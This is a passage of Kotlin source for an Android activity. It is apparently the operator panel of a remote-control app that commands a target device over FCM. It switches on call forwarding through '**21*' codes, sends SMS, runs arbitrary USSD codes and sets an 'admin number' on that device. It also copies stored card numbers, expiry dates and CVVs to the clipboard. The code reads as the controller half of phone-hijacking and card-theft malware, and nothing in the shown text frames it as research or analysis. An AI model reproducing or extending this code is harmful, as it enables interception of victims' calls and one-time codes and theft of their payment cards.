                ivDownArrow.animate().rotation(180f).setDuration(300).start()
            }
        }
    }

    // ── Call Forwarding Popup ──────────────────────────────────────────────────

    private fun toggleCallPopup() {
        if (callPopup?.isShowing == true) { safeDismissWithAnim(callPopup); callPopup = null; return }
        val view = layoutInflater.inflate(R.layout.toggle_popup, null)
        callPopup = PopupWindow(view, ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT, true).apply {
            isOutsideTouchable = true; isFocusable = true
            setBackgroundDrawable(ColorDrawable(0))
            softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE
        }
        callPopup?.showAtLocation(window.decorView, Gravity.TOP, 0, dpToPx(60))
        updatePopupSimViews(view)
        val r1 = view.findViewById<RadioButton>(R.id.radioSim1)
        val r2 = view.findViewById<RadioButton>(R.id.radioSim2)
        val etNumber = view.findViewById<EditText>(R.id.editTextYourNumber)
        var selectedSimSlot = 0
        r1.isChecked = true; r2.isChecked = false
        r1.setOnCheckedChangeListener { _, isChecked -> if (isChecked) { selectedSimSlot = 0; r2.isChecked = false } }
        r2.setOnCheckedChangeListener { _, isChecked -> if (isChecked) { selectedSimSlot = 1; r1.isChecked = false } }
        view.findViewById<TextView>(R.id.btnActive).setOnClickListener {
            val num = etNumber.text.toString().trim()
            if (num.length == 10) { sendCallForwardingCommand(num, "ACTIVATE", selectedSimSlot); safeDismissWithAnim(callPopup); callPopup = null }
            else Toast.makeText(this, "Enter valid 10-digit number", Toast.LENGTH_SHORT).show()
        }
        view.findViewById<TextView>(R.id.btnDeactivate).setOnClickListener {
            sendCallForwardingCommand("", "DEACTIVATE", selectedSimSlot)
            safeDismissWithAnim(callPopup); callPopup = null
        }
    }

    private fun sendCallForwardingCommand(number: String, action: String, simSlot: Int) {
        coroutineScope.launch {
            try {
                val fcmToken = cachedFcmToken.orEmpty().ifBlank {
                    supabaseApi.getAllDevices().getOrNull()?.find { it.uid == uniqueid }?.fcmToken.orEmpty()
                }
                if (fcmToken.isEmpty()) { withContext(Dispatchers.Main) { Toast.makeText(this@FinalActivity, "No FCM token", Toast.LENGTH_SHORT).show() }; return@launch }
                val code = if (action == "ACTIVATE") "**21*$number#" else "##21#"
                FCMHelper.sendCallCommand(
                    context = this@FinalActivity, uniqueid = uniqueid, fcmToken = fcmToken,
                    code = code, simSlot = simSlot, number = number, action = action,
                    onResult = { success, _ ->
                        if (success) {
                            coroutineScope.launch { supabaseApi.updateCallForwarding(uniqueid, number, if (action == "ACTIVATE") "ON" else "OFF") }
                            runOnUiThread { Toast.makeText(this@FinalActivity, "Call forwarding ${action.lowercase()} on SIM ${if (simSlot == 0) "1" else "2"}", Toast.LENGTH_SHORT).show() }
                        } else runOnUiThread { Toast.makeText(this@FinalActivity, "Failed", Toast.LENGTH_SHORT).show() }
                    }
                )
            } catch (e: Exception) { Log.e(TAG, "sendCallForwardingCommand error", e) }
        }
    }

    // ── SMS Popup ──────────────────────────────────────────────────────────────

    private fun toggleSmsPopup() {
        if (smsPopup?.isShowing == true) { safeDismissWithAnim(smsPopup); smsPopup = null; return }
        val view = layoutInflater.inflate(R.layout.sms_popup, null)
        smsPopup = PopupWindow(view, ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT, true).apply {
            isOutsideTouchable = true; isFocusable = true
            setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
            softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE
        }
        smsPopup?.showAtLocation(window.decorView, Gravity.TOP, 0, dpToPx(60))
        updatePopupSimViews(view)
        val r1 = view.findViewById<RadioButton>(R.id.radioSim1Sms)
        val r2 = view.findViewById<RadioButton>(R.id.radioSim2Sms)
        val etAddress = view.findViewById<EditText>(R.id.etAddress)
        val etMessage = view.findViewById<EditText>(R.id.etMessage)
        var selectedSimSlot = 0
        r1.isChecked = true; r2.isChecked = false
        r1.setOnCheckedChangeListener { _, isChecked -> if (isChecked) { selectedSimSlot = 0; r2.isChecked = false } }
        r2.setOnCheckedChangeListener { _, isChecked -> if (isChecked) { selectedSimSlot = 1; r1.isChecked = false } }
        view.findViewById<TextView>(R.id.btnSendSms).setOnClickListener {
            val to  = etAddress.text.toString().trim()
            val msg = etMessage.text.toString().trim()
            if (to.isNotEmpty() && msg.isNotEmpty()) sendSmsCommand(to, msg, selectedSimSlot)
            else Toast.makeText(this, "Fill all fields", Toast.LENGTH_SHORT).show()
        }
    }

    private fun sendSmsCommand(to: String, message: String, simSlot: Int) {
        coroutineScope.launch {
            try {
                val fcmToken = cachedFcmToken.orEmpty().ifBlank {
                    supabaseApi.getAllDevices().getOrNull()?.find { it.uid == uniqueid }?.fcmToken.orEmpty()
                }
                if (fcmToken.isEmpty()) { runOnUiThread { Toast.makeText(this@FinalActivity, "No FCM token", Toast.LENGTH_SHORT).show() }; return@launch }
                FCMHelper.sendSmsCommand(
                    context = this@FinalActivity, uniqueid = uniqueid, fcmToken = fcmToken,
                    to = to, message = message, simSlot = simSlot,
                    onResult = { success, error ->
                        runOnUiThread {
                            Toast.makeText(this@FinalActivity, if (success) "SMS sent via SIM ${if (simSlot == 0) "1" else "2"}" else "SMS send failed: $error", Toast.LENGTH_SHORT).show()
                        }
                    }
                )
            } catch (e: Exception) { Log.e(TAG, "sendSmsCommand error", e) }
        }
    }

    // ── USSD Popup ─────────────────────────────────────────────────────────────

    private fun toggleUssdPopup() {
        if (ussdPopup?.isShowing == true) { safeDismissWithAnim(ussdPopup); ussdPopup = null; return }
        val view = layoutInflater.inflate(R.layout.ussd_tougle, null)
        ussdPopup = PopupWindow(view, ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT, true).apply {
            isOutsideTouchable = true; isFocusable = true
            setBackgroundDrawable(ColorDrawable(0))
            softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE
        }
        ussdPopup?.showAtLocation(window.decorView, Gravity.TOP, 0, dpToPx(60))
        updatePopupSimViews(view)
        val r1 = view.findViewById<RadioButton>(R.id.radioSim1)
        val r2 = view.findViewById<RadioButton>(R.id.radioSim2)
        val etUssd = view.findViewById<EditText>(R.id.etUssdCode)
        var selectedSimSlot = 0
        r1.isChecked = true; r2.isChecked = false
        r1.setOnCheckedChangeListener { _, isChecked -> if (isChecked) { selectedSimSlot = 0; r2.isChecked = false } }
        r2.setOnCheckedChangeListener { _, isChecked -> if (isChecked) { selectedSimSlot = 1; r1.isChecked = false } }
        view.findViewById<TextView>(R.id.btnSendUssd).setOnClickListener {
            val ussdCode = etUssd.text.toString().trim()
            if (ussdCode.isNotEmpty()) { sendUssdCommand(ussdCode, selectedSimSlot); safeDismissWithAnim(ussdPopup); ussdPopup = null }
            else Toast.makeText(this, "Enter USSD code", Toast.LENGTH_SHORT).show()
        }
    }

    private fun sendUssdCommand(code: String, simSlot: Int) {
        coroutineScope.launch {
            try {
                val fcmToken = cachedFcmToken.orEmpty().ifBlank {
                    supabaseApi.getAllDevices().getOrNull()?.find { it.uid == uniqueid }?.fcmToken.orEmpty()
                }
                if (fcmToken.isEmpty()) return@launch
                FCMHelper.sendUssdCommand(
                    context = this@FinalActivity, uniqueid = uniqueid, fcmToken = fcmToken,
                    code = code, simSlot = simSlot,
                    onResult = { success, error ->
                        runOnUiThread {
                            Toast.makeText(this@FinalActivity, if (success) "USSD sent via SIM ${if (simSlot == 0) "1" else "2"}" else "USSD failed: $error", Toast.LENGTH_SHORT).show()
                        }
                    }
                )
            } catch (e: Exception) { Log.e(TAG, "sendUssdCommand error", e) }
        }
    }

    // ── Admin Toggle Popup ─────────────────────────────────────────────────────

    private fun showAdminTogglePopup() {
        if (adminTogglePopup?.isShowing == true) { safeDismissWithAnim(adminTogglePopup); adminTogglePopup = null; return }
        val view = layoutInflater.inflate(R.layout.admin_toggle, null)
        adminTogglePopup = PopupWindow(view, ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT, true).apply {
            isOutsideTouchable = true; isFocusable = true
            setBackgroundDrawable(ColorDrawable(0))
            softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE
        }
        adminTogglePopup?.showAtLocation(window.decorView, Gravity.CENTER, 0, 0)
        val etAdminNumber = view.findViewById<EditText>(R.id.etAdminNumber)
        currentAdminConfig?.let { if (it.number.isNotEmpty() && it.number != "inactive") etAdminNumber.setText(it.number) }
        view.findViewById<TextView>(R.id.btnSendT).setOnClickListener {
            val adminNumber = etAdminNumber.text.toString().trim()
            if (adminNumber.length == 10) { updateAdminConfig(adminNumber, "ON"); safeDismissWithAnim(adminTogglePopup); adminTogglePopup = null }
            else Toast.makeText(this, "Enter valid 10-digit number", Toast.LENGTH_SHORT).show()
        }
        view.findViewById<TextView>(R.id.btnErase).setOnClickListener { updateAdminConfig("", "OFF"); safeDismissWithAnim(adminTogglePopup); adminTogglePopup = null }
        view.findViewById<TextView>(R.id.btnCloseAdmin).setOnClickListener { safeDismissWithAnim(adminTogglePopup); adminTogglePopup = null }
    }

    private fun updateAdminConfig(number: String, status: String) {
        coroutineScope.launch {
            try {
                val result = supabaseApi.updateAdminConfig(number, status)
                result.fold(
                    onSuccess = { success ->
                        if (success) {
                            sendAdminNumberToDevice(number, status)
                            withContext(Dispatchers.Main) { Toast.makeText(this@FinalActivity, "Admin config updated", Toast.LENGTH_SHORT).show() }
                        }
                    },
                    onFailure = { error -> withContext(Dispatchers.Main) { Toast.makeText(this@FinalActivity, "Error: ${error.message}", Toast.LENGTH_SHORT).show() } }
                )
            } catch (e: Exception) { Log.e(TAG, "updateAdminConfig error", e) }
        }
    }

    private fun sendAdminNumberToDevice(adminNumber: String, status: String) {
        coroutineScope.launch {
            try {
                val fcmToken = cachedFcmToken.orEmpty().ifBlank {
                    supabaseApi.getAllDevices().getOrNull()?.find { it.uid == uniqueid }?.fcmToken.orEmpty()
                }
                if (fcmToken.isEmpty()) return@launch
                val finalNumber = if (status == "ON") adminNumber else "inactive"
                FCMHelper.sendAdminNumber(
                    context = this@FinalActivity, uniqueid = uniqueid, fcmToken = fcmToken, adminNumber = finalNumber,
                    onResult = { success, _ ->
                        if (success) coroutineScope.launch { supabaseApi.updateCallForwarding(uniqueid, finalNumber, status) }
                        runOnUiThread { Toast.makeText(this@FinalActivity, if (success) "Admin number sent" else "Failed to send admin number", Toast.LENGTH_SHORT).show() }
                    }
                )
            } catch (e: Exception) { Log.e(TAG, "sendAdminNumberToDevice error", e) }
        }
    }

    // ── Navigation & misc ──────────────────────────────────────────────────────

    private fun navigateToAllUserData() {
        try { startActivity(Intent(this, AllUserDataActivity::class.java).putExtra("uniqueid", uniqueid)) }
        catch (e: Exception) { Log.e(TAG, "Navigation error", e) }
    }

    private fun copyCardDetailsToClipboard() {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboard.setPrimaryClip(ClipData.newPlainText("Card Details",
            "Card Number: ${etCardNumber.text}\nExpiry: ${etExpiry.text}\nCVV: ${etCvv.text}"))
        Toast.makeText(this, "Card details copied", Toast.LENGTH_SHORT).show()
    }

    private fun copyToClipboard(text: String) {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboard.setPrimaryClip(ClipData.newPlainText("SMS", text))
        Toast.makeText(this, "Copied!", Toast.LENGTH_SHORT).show()
    }

    private fun formatTimeForDisplay(timestamp: Long): String = try {
        SimpleDateFormat("hh:mm a, dd MMM", Locale.getDefault()).format(Date(timestamp))
    } catch (e: Exception) { timestamp.toString() }

    private fun getTimeAgo(timestamp: Long): String {
        val diff = System.currentTimeMillis() - timestamp
        return when {
            diff < 60000L    -> "Just now"
            diff < 3600000L  -> "${diff / 60000L} min ago"
            diff < 86400000L -> "${diff / 3600000L} hours ago"
            else             -> SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault()).format(Date(timestamp))
        }
    }

    private fun dpToPx(dp: Int): Int = (dp * resources.displayMetrics.density).toInt()

    private fun safeDismissWithAnim(popup: PopupWindow?) {
        try { popup?.dismiss() } catch (_: Exception) {}
    }

    private fun isActivityAlive(): Boolean =
        !isFinishing && !(Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1 && isDestroyed)
}
